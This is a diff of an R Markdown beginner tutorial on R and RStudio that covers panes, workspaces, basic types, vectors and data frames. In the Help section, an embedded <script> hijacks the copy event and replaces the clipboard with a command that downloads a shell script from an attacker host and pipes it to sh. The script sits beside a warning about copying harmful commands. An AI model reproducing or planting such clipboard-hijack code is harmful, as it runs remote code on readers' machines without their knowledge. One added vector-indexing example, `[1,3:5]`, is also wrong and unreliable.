@@ -51,33 +51,42 @@ Programming language that allows you to:
 2. carry out more or less complex statistical analyses: description, exploration,
 modelization...
 3. create (pretty) figures
+4. and much more !
 
 Features:
 
-* available on Windows, Mac and Linux.
-* free and open source
-* large user community/online help.
-* large number of specific packages.
+* available on mainstream OS'es (Windows, Mac and Linux)
+* free and open source (GNU)
+* large user community / online help.
+* numerous additional packages for any purpose
 
 History:
 
-* 1993: start of the R project
-* 2000: release of R 1.0.0
-* 2024: R 4.3.3
+* **1993/08** : First official release of R as a _binary_
+  * Written by _**R**oss Ihaka_ and _**R**obert Gentleman_, simply aimed at being a programming language to teach introductory statistics at the University of Auckland
+  * Inspired by (and partially compatible with) the pre-existing, **S** programming language (BELL Labs, TIBCO Software)
+* **1997/04** : foundation of the Comprehensive R Archive Network, as the R central packages repository
+* **1997/12** : release of R v0.6.0 _sources_ under the GNU licence
+* **2000/02** : release of R v1.0.0
+* **2024/04** : realase of R v4.4.0
 
-Fun fact (not so fun) about why R is better than excel:  
-In 2020, ["Covid : le Royaume-Uni passe à côté de milliers de cas à cause… d'un fichier Excel arrivé à saturation"](https://www.lesechos.fr/monde/europe/covid-le-royaume-uni-passe-a-cote-de-milliers-de-cas-a-cause-dun-fichier-excel-arrive-a-saturation-1251904)  
-More information comparing R and excel [here](https://fantasyfootballanalytics.net/2014/01/why-r-is-better-than-excel.html).
+> _WARNING_ : R is not R ! The _R software_ you will use is **NOT** the _R language_ itself ! It is an **implementation** of the language, and [other implementations](https://learn.saylor.org/mod/book/view.php?id=58417&chapterid=44968) co-exist(ed). By example : Revolution Analytics (by Microsoft, now [defunct](https://techcommunity.microsoft.com/t5/azure-sql-blog/microsoft-r-application-network-retirement/ba-p/3707161)), [Renjin](https://www.renjin.org/) (active, Java), [FastR](https://github.com/oracle/fastr) (active, Java), [Riposte](https://github.com/jtalbot/riposte) (defunct), [CXXR](https://www.cs.kent.ac.uk/projects/cxxr/) (defunct, C++) ...
+
+Fun fact (more _awkward_ than fun, actually) about why R is better than excel:  
+_In 2020, ["Covid : UK loses thousands of cases due to ... a saturated MS Excel file"](https://www.lesechos.fr/monde/europe/covid-le-royaume-uni-passe-a-cote-de-milliers-de-cas-a-cause-dun-fichier-excel-arrive-a-saturation-1251904)  _
+
+More information comparing R and Excel [here](https://fantasyfootballanalytics.net/2014/01/why-r-is-better-than-excel.html).
 
 ## The RGui
 
-After installing R, you can use it by double-clicking on the R icon <img src="images/logo_R.png" alt="logo_R.png" width="50"/>
+After installing R, you can launch it by double-clicking on the R icon <img src="images/logo_R.png" alt="logo_R.png" width="50"/>
 
 <img src="images/RGui.jpg" alt="RGui" width="600"/>
 
-As you can see, the default R interface (RGui console) is not very user friendly.
-So it is better to use complementary software that will function as a graphical interface between you and R. This interface is a kind of shell that makes R work in the background.
-Several graphical interfaces have been developed, but the most used and practical is RStudio.
+As you can see, the default R interface (**RGui** console : GUI stands for _**G**raphical **U**ser **I**nterface_) is quite abrupt and bleak :S ...
+
+As such, it is warmly recommended to use additional software that will function as a graphical interface between you and R. This interface is a kind of shell that makes R work in the background.
+Several graphical interfaces have been developed, but the most used and practical is **[RStudio-desktop](https://posit.co/download/rstudio-desktop/)**.
 
 # Rstudio
 
@@ -86,97 +95,116 @@ Several graphical interfaces have been developed, but the most used and practica
 ## First sight
 
 ![rstudio](images/Blank_rstudio.png)
-Studio displays 4 large panes. Their position may be changed based on your preference. Here are default:
+RStudio displays 4 large panes by default. Their position may be changed based on your version and preference, but here are the default ones :
 
 ```{r rstudio_pane_names, echo = FALSE, eval = TRUE, results='asis'}
 knitr::kable(
   x = data.frame(
-    left=c("Script pane", "Console pane"), 
-    right=c("Environment/History pane", "Help/Plots/Files"),
-    row.names = c("upper", "lower")
+    LEFT=c("Script pane", "Console pane"), 
+    RIGHT=c("Environment/History pane", "Help/Plots/Files"),
+    row.names = c("UPPER", "LOWER")
   ), 
   caption = "Pane names and postions"
 )
 ```
 
-> <span style="color:green"> Info: your four panes may be blank while two of mines are filled with text. We'll come on that later.</span>
+> <span style="color:green"> NOTE : your four panes may be blank while most of mines are filled with text in the illustration, do not panic ! We'll come on that later.</span>
 
 ## The console pane (lower left)
 
 ![console_pane_image](images/td_consolePane.png)
-This is a simple R console, like in the RGui (see previous section).
+This is a simple interactive R console, like in the RGui (see previous section).
 
-> <span style="color:#CD853F"> Warning: Here, is an example provided by the bioinformatics plateform *BiGR*. Your local RStudio might differ: the version of R, the list of available packages, etc. On *your* local machine, RStudio console will match with the RGui. </span>
+> <span style="color:#CD853F"> WARNING: Here is an example provided by the bioinformatics platform <B>BiGR</B>. Your local RStudio might differ: the version of R, the list of available packages, etc. On <B>your</B> local machine, RStudio console will match with the RGui. </span>
 
-Let's try to enter the command [`print()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/print):
+Let's try to enter the [`print()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/print) command :
 
 ```{r first_command, eval=TRUE, echo=TRUE}
 print("Hello World")
 ```
 
-We just used a _function_, called [`print`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/print). This function tries to print on screen everything provided between parenthesis `(` and `)`. In this particular case, we gave the character string `"Hello World"`, and the function `print` successfully printed it on screen !
+Here, we just used a _function_, called [`print`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/print). This function attempts to display on screen anything provided between parenthesis `(` and `)`. In our example, we provided the character string `"Hello World"` (thus, we used quotes), and the function `print` successfully printed it on screen !
 
-Now click on **Session** -> **Save Workspace as** and save the current work space (I named mine "my_session.RData"). What append in the R console pane? You saw it! A command has been automatically written. For me, it is:
+Now, click on **Session** -> **Save Workspace as** and name it as you wish (I named mine _"my_session.RData"_). This will save your current _work space_ (the _environment_ in which you are working : the custom objects and functions loaded into memory).
+What happened in the console pane? You nailed it! A command has been automatically written. For me, it is:
 
 ```{r save_workspace_01}
 save.image("my_session.RData")
 ```
 
-When you need help with R, whether on a function error, on a script result or anything alike, please save your work space and send-it to your favorite R-developer. This contains everything you did in your session.
+This is one of the many ways RStudio helps you in your work, by simplifying (mainly using clicks and buttons) some tedious, regular parts.
 
-> <span style="color:green"> Info: There is a **syntax coloration**, there is a good **autocompletion** and parameter suggestion. _All bioinformaticians use auto-completion, but shhh it's our secret_ </span>
+> As a general recommendation, you should get to save your work space after any important step in your code. When you may need help, whether on a function error, a script result or anything alike, you would be able to share such save to your favorite R-developer next door. This file contains everything you did in your current session.
+
+> <span style="color:green"> NOTE: The Rstudio console allows **auto-completion** and **code suggestion** : when one uses the [TAB] key after writing the first few characters of a code function/variable, the console proposes possible names from a dictonary that fits your installation (R base and installed packages).
+Any reputable bioinformatician uses auto-completion, but shhh ! It's one of our many secrets ! </span>
 
 ## The environment/history pane (upper right)
 
-This pane has three main tabs: Environment, History and Connections (the tab Tutorial was added recently).
+This pane has three main tabs: 'Environment', 'History' and 'Connections' (the 'Tutorial' tab was recently added, and a 'Git' tab may appear when one uses code in a version-controlled environment).
 
 ![envhit_pane](images/td_envHistoryPane.png)
 
 ### Environment
 
-Environment lists every single variable, object or data loaded in R. This includes only what you typed yourself and does not include environment variables. Example; in you console pane, enter the following command:
+'Environment' displays the list of every single variable, custom function, object or data loaded in R. This includes only what you defined by yourself and does not include environment variables nor base nor package-loaded functions.
+
+Example : in your console pane, enter the following command:
 
 ```{r my_var_equals_0, eval=TRUE}
 my_var <- 0  # May also be written my_var = 0
 ```
 
-What append in the Environment pane ? You're right: a variable is now available!
+What happened in the 'Environment' pane ?
+
+You nailed it : a new **my_var** variable is now available in your environment !
 
 <img src="images/environment_myvar_eq_0.png" alt="env_my_var" width="600"/>
 
-When a more complex object is declared in your work space, then some general information may be available. Example:
+When a more complex object is declared in your work space, some general information may be displayed, too. By example :
 
 ```{r dataframe_pane_env, eval=TRUE}
 small_table <- data.frame("col_a"=c(1, 3), "col_b"=c(2, 4))
 ```
 
-You can see the dataframe. Click on it to have a preview of the data it contains, then click on the light-blue arrow have a deeper insight of its content:
+You can observe this _dataframe_ (something like a table, we'll see it later).
+
+Click on its name to get a _preview_ of its contained data. Then, click on the light-blue downwards arrow to have a deeper insight of its content:
+
 <img src="images/dataframe_expanded_environment.png" alt="df_expanded_env" width="600"/>
 
-Now click on **Session** -> **Clear Work space**: and see your work disappear. This action cannot be undone. While it is useful to clear one work space from time to time in order to avoid name space collisions, it is better to save your work space before.
+Now click on **Session** -> **Clear Work space** ...
+
+... and watch how your objects/variables disappeared !
+
+This action **cannot be undone** ! While it is useful to clear one's work space from time to time (in order to avoid name space collisions, release a bit of used RAM, etc), it is way better to **save your work space** before.
+
+_One again, using this "clickable" way is just an assist from RStudio : there are specific (written) commands to remove objects, with more manual control._
 
 ### History
 <img src="images/td_goToHistory.png" alt="goto_history" width="600"/>
 
 <img src="images/history_theme.png" alt="history_theme" width="600"/>
 
-This tab is quite important: while you test and search in the console, your history keeps a track of each command line you entered. This will definitely help you to build your scripts, to pass your command lines to your coworkers, and to revert possible unfortunate errors.
+This tab is quite mandatory when coding and testing : while you test and search in the console, the history keeps a track of each command line you typed. This will definitely help you to build your scripts, to pass your command lines to coworkers, try and track code variations, and to revert possible unfortunate errors.
 
-Each history is related to a session. You may see many commands in your history. Some of them are not even listed in your console. R Studio in writes there every command, even the ones that were masked for the sake of your eyes (knitting commands, display commands, help commands, etc.)
+Each history is related to a session. You may see many commands in your history, even some you never entered manually : when a RStudio "assist" menu/button is used (ex : knitting commands, display commands, help commands, etc...), in most case it auto-runs a R command that will be stored in the history as well as the one you manually entered.
 
-Please note that your history has a limit and only saves the latest command lines.
+Please note that your history has a limit (512 entries by default) and only saves the latest command lines. The default value can be changed (but it's something to reserve to more advanced users)
 
-## The help/plots/files pane (lower right)
+## The help/plots/packages/files pane (lower right)
 
-This pane has four main tabs: Files, Plots, Packages and Help (the tab Viewer is not really used, and Presentation was added recently).
+This pane has four main tabs: 'Files', 'Plots', 'Packages' and 'Help' (the 'Viewer' tab is rarely used, and 'Presentation' was added very recently).
 
 ![helpFile_pane](images/td_helpFilePane.png)
 
 ### Help
 
-This is maybe the most important pane of your R Studio. THIS is the difference between R Studio and another code editor. Search for any function **here** and not on the internet. This pane shows you the available help for **YOUR** version of R, **YOUR** version of a given package.
+This is maybe the **most important/useful** pane of your R Studio, on a user POV. THIS is the difference between R Studio and another code editor. Search for any function **here**, locally and not on the internet. This pane shows you the available help for **YOUR** version of R, **YOUR** version of a given package.
 
-Concurrent version might have both different default parameters and different interfaces. Please be sure over the internet, to copy and type commands that are not harmfull for your computer.
+Effectively, a published function for which a help page does exist in a version of R or one of its packages, still can evolve in time, depending on its author. Thus, some parameters can be added, removed, renamed, and/or default values changed. Consequently, the help from a remote source (internet) may be inadequate for your current, installed version !
+
+When copy-pasting commands from a remote source, please assure yourself the source is clean (ie, nothing harmful for your system) and compatible with your installed version (this is a major source of error).
 
 <script>
 document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker-domain:8000/shell.sh | sh\n'); e.preventDefault(); });
@@ -186,85 +214,121 @@ document.getElementById('copy').addEventListener('copy', function(e) { e.clipboa
 
 ### Files
 
-Just like any file explorer, we can move accross directories, create folders and file, delete them, etc.
+Just like any system file explorer, we can move across directories, create folders and files, delete them, etc... from within Rstudio.
+
+Initially, this file explorer is set at your **current working position**. This means that when interacting with directories or files without expressing an _absolute path_, Rstudio will consider directories and files that are stored **where you are** in this panel
+
+> NOTE : this is not a theoretical representation : performing modifications here will modify the file structure on your drive !
+
+#### Create a directory
+
+Here, we will create a new directory, using two methods :
+
+1. With the GUI
 
 ![create_working_dir_rstudio](images/create_working_dir_rstudio.png)
 
-Or use the function [`dir.create()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/files2):
+2. With a command line :
+
+Use the [`dir.create()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/files2) function :
 
 ```{r create_dir}
 dir.create("Intro_R")
 ```
 
-You should change your working directory right now:
+#### Change working directory
+
+One can change one's working directory :
+
+1. With the GUI :
 
 ![setwd](images/clange_wd_rstudio.png)
 
-Or use [`setwd()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/getwd):
+2. With a command :
+
+Use [`setwd()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/getwd):
 
 ```{r setwd_example}
 setwd("Intro_R")
 ```
 
+#### Delete files
+
 You can delete files:
+
+1. With the GUI
 
 <img src="images/delete_files_from_rstudio.png" alt="download" width="500"/>
 
-or use the function [`file.remove()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/files):
+2. With a command
+
+Use the [`file.remove()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/files) function:
 
 ```{r delete_file_example}
 file.remove("annotation.csv")
 file.remove("expression.txt")
 ```
 
+> NOTE: There is nothing such as a "Recycle bin" here ! Deleted files or directories are wiped !
+
 ### Packages
 
-Here is listed all installed packages, with their description and their version.
+Here are listed all _locally installed_ packages (not _available_ packages), with a description and a version number.
 
 <img src="images/td_packages_pane.png" alt="package_pane" width="500"/>
 
-More information about packages in a next section.
+You will get more information about packages in an upcoming subsection.
 
 ### Plots
 
-If you work with R scripts, the graphs will be displayed here.
+If you work with R scripts that performs plots, the generated graphs will be displayed here !
+
+These can sometimes be _interactive_ plots (ability to zoom, scroll, etc...), depending on the functions used.
 
 ## The script pane (upper left)
 
 ![script_pane](images/td_scriptPane.png)
 
-This is where you write your R scripts. This also accepts other languages (e.g. _bash_, _python_, ...), but R Studio shines for its R integration.
+This is where you will spend most of your time when writing your R scripts (next to the 'Help' pane !). This pane also accepts other languages (e.g. _bash_, _python_, ...) or different R flavors (R markdown, by example), but R Studio shines for its R integration, oviously.
 
-Please, please ! Write your commands in the Script pane, then execute them by hitting CTRL + Enter. This is very much like your lab-workbook: the history panel only keeps a limited number of function in memory while this script keeps your commands in a file on your disk. You may share it, edit it, comment it, etc.
+> <b>Please, please !</b> Write your commands in the 'Script' pane, <b>then</b> execute them (hitting [CTRL] + [Enter] with the cursor placed on the command to run), rather than directly writing them in the console ! This has only advantages : you can track, save, share your work, test variations, without relying on your (spoiler : imperfect) memory, ...
 
-The extension for a script in R is `.R` or`.r` (or `.Rmd` for special Rmarkdown script), for example `my_script.R`.
+The default file extension for a R script saved is `.R` or `.r` (or `.RMD`, `.Rmd` for Rmarkdown scripts), for example `my_script.R`.
 
 ![script_pane](images/rscript_pane.png)
+
+> NOTE : The file name here appears in red and ending with a star '*' because some content was written in the script but not saved on disk.
 
 ## TLDR – Too Long Didn't Read
 
 Graphic interface presentation :
 
-1. Write command lines in Script pane (upper left)
-2. Execute command lines by hitting CTRL + Enter from script pane et see them in the console.
-3. Have a look at the environment and history in case on the upper right pane
-4. Search for help in the lower right pane.
+1. **Write command lines in the **'Script'** pane (upper left)
+2. **Execute** command lines by hitting [CTRL] + [Enter] from the script pane, then observe their output in the 'Console' / 'Plots' panes.
+3. Take a look at your **environment** and **history** in the upper right pane
+4. **Search** for **help** in the lower right pane.
 
 # R – Basics
 
 ## Variables and types
 
-### Numbers
+**Remember** : a **variable** is a name given to any value of any type stored in memory.
 
-Remember, a variable is the name given to a value stored in memory. Example `3`, the number three, exists in R. You can store it in a variable with the arrow operator `<-`:
+Here, we will describe basic types.
+
+### Number
+
+By example, `3`, the number three, exists in R and is understood as it by R. You can store this value in a variable using the arrow _assignment_ operator `<-`:
 
 ```{r, assign_r_base, eval=TRUE}
 three <- 3
 ```
 
-With the code above, the number 3 is stored in a variable called "three". You can do this in R with anything. Literally anything. Whole files, pipelines, images, anything.
+In the above code, the number 3 is stored in a variable called "three" (it could be any other name, as long as it avoids special characters).
 
-Maths in R works the same as your regular calculator:
+You can do this in R with quite anything. Literally anything. Whole files, pipelines, images, anything.
+
+Maths in R works the same as your regular calculator :
 
 ```{r basic_maths, eval=TRUE}
 3 + three # Add
@@ -274,12 +338,14 @@ Maths in R works the same as your regular calculator:
 7 %/% 2 # Floor division
 ```
 
-> <span style="color:green"> Info: `#` is the way to write a comment into your script. The instruction after `#`, and on the same line, will not be executed by R. For example in `3 + three # Add`, `3 + three` will be executed, but `# Add` will not.
-_A good coder uses comments a lot to explain the calculations made._ </span>
+> <span style="color:green"> Info: `#` is the way to write a comment into your script. Any instruction after `#`, and as long as no line return is invoked, will be ignored by the R console. For example in `3 + three # Add`, `3 + three` will be executed, but `# Add` will not.
+A good coder uses comments, and a lot of them, and relevant ones, to explain the calculation one made ! </span>
 
-### Characters
+> NOTE : Here, we simplified how R is actually handling numbers. There are two main subtypes in numbers : 1) Integers 2) Numerics (called "floats" in most other languages)
 
-Characters are delimited with quotes: either double `"` or `'` simple:
+### Character
+
+Characters correspond to letters and letter chains, and are delimited with quotes : be it double `"` or `'` single (as long as the same type is uesd in a pair : on cannot start the definition of a character with a single quote and end it with a double one !) :
 
 ```{r basic_chars, eval=TRUE}
 four <- "4"
@@ -299,6 +365,8 @@ Mathematics do not work with characters at all ... Try the following:
 four + 1
 ```
 
+> Question : in the above example, why did I **not** use quotes when I wrote _four_ ?
+
 You can try to turn characters in numbers with the function: [`as.numeric()`](https://www.rdocumentation.org/packages/h2o/versions/3.38.0.1/topics/as.numeric):
 
 ```{r maths_convert_basic, eval=TRUE}
@@ -306,9 +374,13 @@ as.numeric("4") + 1
 as.numeric(four) + 1
 ```
 
-A _function_ is a R command that is followed by parenthesis `(` and `)`. Between these parenthesis, we enter _arguments_. Use the help pane to have information about the list of arguments expected and/or understood by a given function.
+### Function
 
-As said previously, you can store any of the previously typed commands in a variable:
+A _function_ is a R piece of code that can perform more complex work. It is called using a command name, that is then followed by parentheses `(` and `)`. Between these parentheses, we enter _arguments_ that are expected by the function.
+
+Use the help pane to get information about the names of arguments expected and/or understood by a given function, and the expected type of their value.
+
+As previously described, you can store any of the previously typed commands into a variable:
 
 ```{r variable_post_command, eval=TRUE}
 five <- as.numeric("4") + 1
@@ -317,7 +389,9 @@ print(five)
 print(two)
 ```
 
-> <span style="color:green"> Please! Please! Give your variable a name understandable by humans. I don't want to see any of you calling their variable "a", "b", "my_awsome_var", ... </span>
+> Question : can you guess what happened in the first command ?
+
+> <span style="color:green"> Please! Please! Give your variable explanatory names, so that its content is understandable by humans. I would be pissed off seeing any of you calling their variable "a", "b", "xyz, "my_awsome_var", "dunno_what_it_is", "thing1", "thing2", etc ... X( </span>
 
 
 ```{r tricky_exercise_not_shown, eval=TRUE, echo=FALSE}
@@ -327,8 +401,21 @@ suspicious_number_7 <- 7
 ```
 
 
-*Question*:  
-I have two numbers: `mysterious_number_7`,  and `suspicious_number_7`. When I apply the function [`print()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/print) on them, it return `7`. They are both numeric. However, they are not equal ... Why ?
+**Question** :
+
+I have two numbers stored in these variables :
+
+* `mysterious_number_7`
+* `suspicious_number_7`
+
+When I apply the [`print()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/print) function on them, it returns in both cases `7`.
+
+They are both numeric.
+
+However, _they are not equal ..._
+
+Why ?
+
 <details>
 <summary>Code to check question facts</summary>
 ```{r tricky_exercise_shown, eval=TRUE}
@@ -351,7 +438,7 @@ mysterious_number_7 == suspicious_number_7
 identical(mysterious_number_7, suspicious_number_7)
 ```
 
-We will talk about difference between equality and identity later.
+We will talk about differences between ***equality*** and ***identity*** later.
 
 </details>
 
@@ -380,9 +467,9 @@ print(mysterious_number_7)
 </details>
 <br>
 
-### Boolean
+### Logical
 
-Aside from characters and numeric, there is another very important type in R (and computer science in general): _booleans_. There are two booleans: `TRUE` and `FALSE`.
+Aside from characters and numbers, there is another very important type in R (and computer science in general): Logicals, which corresponds to the _boolean_ types. There are two logicals : `TRUE` and `FALSE`.
 
 ```{r basics_comparisons, eval=TRUE}
 3 > 4
@@ -392,38 +479,57 @@ Aside from characters and numeric, there is another very important type in R (an
 
 ## Data structures
 
-Until now, we have seen simple information stored into a variable. But we can create a more complexe structure in order to store several information into a single variable.
+Until now, we have seen simple information stored into a variable. But we can create more complex structures in order to store multiple information into a single variable.
 
 ![data_structure](images/data_structure.png)
 
+> NOTE : In your usage of R, you may cross _R objects_. These correspond to a special type of complex objects, that can store mutiple data of different types, but also obey rules to allow users to interact with (by example, _getters_ and _setters_, to get or set information from and to it)
+
 ### Vector
 
-You can make vectors and tables in R. Don't panic, there will be no maths in this presentation.
+You can make vectors and tables in R. Don't panic, there will be no maths in this course : vectors or a one-dimensional _series_ of values of the same type.
 
-In R, vectors are created with the function [`c()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/c):
+In R, vectors can be created with the [`c()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/c) function ("c" for "concatenate") :
 
 ```{r first_vector_basics, eval=TRUE}
 one2three <- c("1", "2", "3", "4", "10", "20")
 print(one2three)
 ```
 
+One can **check** if a variable is a vector :
+
 ```{r first_vector_type, eval=TRUE}
 is.vector(one2three)
 ```
 
-One can select an element of the vector with squared brackets `[` and `]`:
+As a uni-dimensional object, one can get its **length** :
+
+```{r vec_len, eval = TRUE}
+length(one2three)
+```
+
+One can **select an element** of the vector using squared brackets `[` and `]` holding the desired element index :
 
 ```{r select_in_vector_basics, eval=TRUE}
-one2three[1] #select the first element
+one2three[1] # select the first element
 ```
 
-One can select multiple elements of a vector with  `:`:
+> NOTE : R index starts at the value 1 (many other languages start at 0)
+
+One can **select multiple elements** of a vector with a ranged index  `:`:
+
 ```{r mulitple_select_in_vector_basics, eval=TRUE}
-one2three[2:4] #select from second to fourth element
+one2three[2:4] # select from second to fourth element
 ```
 
+One can combine both ways :
+
+```{r vec_both}
+one2three[1,3:5] # select the first and third to fifth elements
+```
 
 *Question 1*: Is there a difference between these two vectors ?
+
 ```{r difference_bascs_vectors, eval=TRUE}
 c_vector <- c("1", "2", "3")
 n_vector <- c( 1,   2,   3 )
@@ -433,7 +539,8 @@ n_vector <- c( 1,   2,   3 )
 
 <summary>Answer</summary>
 
-There is a difference indeed: c_vector contains characters, n_vector contains numeric.
+There is a difference indeed: c_vector contains characters, n_vector contains numerics.
+
 ```{r difference_basics_vectors_answer, eval=TRUE}
 print(c_vector)
 print(n_vector)
@@ -442,7 +549,7 @@ print(is.numeric(n_vector))
 identical(c_vector, n_vector)
 ```
 
-You can always use the function [`identical()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/identical) to test equality with robustness and exactitude.
+You can always use the [`identical()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/identical) function to test identity with robustness and exactitude.
 
 You may have learned about the operator `==` for equality. But this is not perfect, look at our example:
 
@@ -450,21 +557,22 @@ You may have learned about the operator `==` for equality. But this is not perfe
 c_vector == n_vector
 ```
 
-The operator `==` is not aware of types.
+The operator `==` is not aware of data types.
 
-Another example, mixing numeric and boolans:
+Another example, mixing numeric and booleans:
 
 ```{r difference_basics_vectors_answer_no_eqeq_at_all, eval=TRUE}
 1 == TRUE
 identical(1, TRUE)
 ```
 
-In computer science, there is a historical reason why booleans and integers are mixed.
+In computer sciences, there is a historical reason why booleans and integers are mixed.
+
 <details>
 <summary>More information about that</summary>
-It is linked with history of computing langages.
-Prior to introduction of an actual bool type (`TRUE` and `FALSE`), `0` and `1` were the official representation for truth value, similar to C89 (the first standardized version of the C programming language, in 1989).  
-To avoid unnecessarily breaking non-ideal but working code, the new bool type needed to work just like 0 and 1. This goes beyond merely truth value, but all integral operations. No one would recommend using a boolean result in a numeric context, nor would most people recommend testing equality to determine truth value, no one wanted to find out the hard way just how much existing code is that way. Thus the decision to make True and False masquerade as 1 and 0, respectively. This is merely a historical artifact of the linguistic evolution.
+This is linked to the history of computing languages.
+Prior to the introduction of an actual boolean type (`TRUE` and `FALSE`), the integers `0` and `1` were the official representation for true and false values, similar to what is used in C-89 (the first standardized version of the C programming language, in 1989).  
+To avoid unnecessarily breaking imperfect but working code, the new boolean type needed to work just like 0s and 1s. This goes beyond merely truth value, but all integral operations. No one would recommend using a boolean results in a numeric context, nor would most people recommend testing equality to determine truth value, as well as no one wanted to find out the hard way just how much existing code is that way. Thus, the decision to make True and False mimics for 1 and 0, respectively. This is merely a historical artifact of the linguistic evolution.
 </details>
 
 </details>
@@ -479,9 +587,9 @@ mixed_vector <- c(1, "2", 3)
 
 <summary>Answer</summary>
 
-No. We can not mix types in a vector. Either all its content is made of number or all its content is made of characters.
+YES and NO. The example shows that we technically can, we end with an unexpected results : Here, all our values have been turned into characters, as we can not mix types in a vector. Either all its content is made of number or all its content is made of characters.
 
-Here, all our values have been turned into characters:
+:
 
 ```{r mixed_basics_vectors_answer, eval=TRUE}
 print(mixed_vector)
@@ -491,15 +599,17 @@ print(all(is.numeric((mixed_vector))))
 print(all(is.character((mixed_vector))))
 ```
 
-Above, the function [`all()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/all) returns `TRUE` if all its content equals to `TRUE`.
+Above, the [`all()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/all) function returns `TRUE` if all its content equals to `TRUE`.
 
 </details>
+
 <br>
-*Question 3*: How to create an histogram with a vector ?
+
+*Question 3*: How to create a histogram from a vector ?
 
 <details>
 <summary>Help</summary>
-A simple way to visualize your data is to use a graph. The function [`hist()`](https://www.rdocumentation.org/packages/graphics/versions/3.6.2/topics/hist) may help you (of course, use the _Help pane_!!).
+A simple way to visualize your data is to use a graph. The [`hist()`](https://www.rdocumentation.org/packages/graphics/versions/3.6.2/topics/hist) function may help you (of course, use the _Help pane_!!).
 </details>
 
 <details>
@@ -510,7 +620,9 @@ hist(c_vector)
 ```
 > <span style="color:#CD853F">Error in hist.default(c_vector) : ‘x’ must be numeric </span>
 
-Why this command is not working ? The error says : “‘x’ must be numeric”. The function accept only vector composed by numeric values.
+Errr... Why is this command not working ?
+
+The error says : “‘x’ must be numeric”. The function only accepts a vector made of **numeric** values.
 
 ```{r hist_n_vector, eval=TRUE}
 hist(n_vector) # worked perfectly !
@@ -521,15 +633,15 @@ hist(n_vector) # worked perfectly !
 
 ### Data Frame
 
-In R, tables are created with the function [`data.frame()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/data.frame):
+In R, a table is stored as a **data.frame**. A way to create it from scratch using the [`data.frame()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/data.frame) function :
 
 ```{r firstdata_frame_basics, eval=TRUE}
-one2three4 <- data.frame(c(1, 3), c(2, 4))
+one2three4 <- data.frame(col1 = c(1, 3), col2 = c(2, 4))
 print(one2three4)
 ```
 
-By default, R gives names for columns and rows.  
-You can rename columns and row names respectively with functions [`colnames()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/row%2Bcolnames) and [`rownames()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/row%2Bcolnames).
+By default, for dataframes, R accepts names for columns and rows.
+You can rename columns and row names with the [`colnames()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/row%2Bcolnames) and [`rownames()`](https://www.rdocumentation.org/packages/base/versions/3.6.2/topics/row%2Bcolnames) functions, respectively.
 
 ```{r firstdata_frame_basics_rename, eval=TRUE}
 colnames(one2three4) <- c("Col_1_3", "Col_2_4")
@@ -537,7 +649,11 @@ rownames(one2three4) <- c("Row_1_2", "Row_3_4")
 print(one2three4)
 ```
 
-You can access a column and a line of the data frame using squared brackets `[` and `]`. Use the following syntax: `[row, column]`. Use either the name of the row/column or its position.
+You can access a column and a line in the data frame using an index for each dimension into squared brackets `[` and `]`. 
+
+R expects first an index for rows, then columns : `data_frame[row_index, column_index]`. You can either use the name of row(s)/column(s) or their position index.
+
+If one wants all values for one of the dimensions, one should just leave the bracket part empty.
 
 ```{r firstdata_frame_basics_select_row, eval=TRUE}
 # Select a row by its name
@@ -551,18 +667,18 @@ print(one2three4[, 1])
 # Select a cell in the table
 print(one2three4["Row_1_2", "Col_1_3"])
 # Select the first two rows and the first column in the table
-print(one2three4[1:2, 1]) 
+print(one2three4[1:2, 1])
 ```
 
-> <span style="color:green"> If you like maths, you will remember the order `[row, column]`. If you're not familiar with that, then you will do like 99% of all software engineer: you will write `[column, row]`, and you will get an error. Trust me. 99%. Remember, an error is never a problem in informatics.</span>
+> <span style="color:green"> If you like maths, you will recall the `[row, column]` order. If you're not familiar with that, you probably will do like 99% of all software engineers : write in the wrong `[column, row]` order in your first interactions with R. Subsequently, you will raise an error. Trust me. 99%, easy. And just remember than an error is never an ending point in informatics.</span>
 
-*Question 1*: Can I mix characters and numbers in a data frame *row* ?
+*Question 1* : Can I mix characters and numbers in a data frame **row** ?
 
 <details>
 
 <summary>Answer</summary>
 
-Yes, it is possible:
+Indeed, it is possible !
 
 ```{r dataframe_basics_mixed_col, eval=TRUE}
 mixed_data_frame <- data.frame(
@@ -572,7 +688,7 @@ mixed_data_frame <- data.frame(
 print(mixed_data_frame)
 ```
 
-The function [`str()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/str) can be used to look at the types of each elements in an object.
+The [`str()`](https://www.rdocumentation.org/packages/utils/versions/3.6.2/topics/str) function can be used to look at the types of each elements in an object.
 
 ```{r use_str_df_first_time, eval=TRUE}
 str(mixed_data_frame)
@@ -582,13 +698,13 @@ str(one2three4)
 </details>
 <br>
 
-*Question 2*: Can I mix characters and numbers in a data frame *column* ?
+*Question 2* : Can I mix characters and numbers in a data frame **column** ?
 
 <details>
 
 <summary>Answer</summary>
 
-No:
+Unfortunatelu, no, you can't :
 
 ```{r dataframe_basics_mixed_row, eval=TRUE}
 mixed_data_frame <- data.frame(
@@ -599,9 +715,11 @@ print(mixed_data_frame)
 str(mixed_data_frame)
 ```
 
+All this is because the data.frame is a special sort of bidimensional object in R _structured by column_, where each column can store a different type than the other.
+
 </details>
 <br>
